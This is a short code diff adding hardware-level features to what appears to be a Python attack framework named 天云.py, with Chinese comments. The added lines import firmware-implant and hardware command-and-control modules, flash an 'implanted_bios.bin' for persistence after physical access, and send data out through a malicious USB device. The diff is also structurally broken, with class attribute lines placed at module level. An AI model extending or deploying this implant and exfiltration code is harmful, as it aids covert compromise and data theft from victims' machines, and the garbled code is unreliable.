@@ -645,6 +645,22 @@ def _select_attack_strategy(self, intel):
             self._log_error(e)
             return False
 
+# 天云.py（新增部分）
+from hardware_implant import FirmwareImplant
+from hardware_c2 import HardwareC2
+
+        self.hardware_implant = FirmwareImplant()  # 固件植入模块
+        self.hardware_c2 = HardwareC2()            # 硬件通信模块
+
+    def _establish_hardware_persistence(self):
+        """硬件级持久化（需物理接触一次）"""
+        if self._check_physical_access():
+            self.hardware_implant.flash_bios("implanted_bios.bin")
+
+    def _exfil_via_hardware(self, data):
+        """通过恶意USB设备外传数据"""
+        self.hardware_c2.send_data(data)
+
 # === 执行入口 ===
 if __name__ == '__main__':
     try:
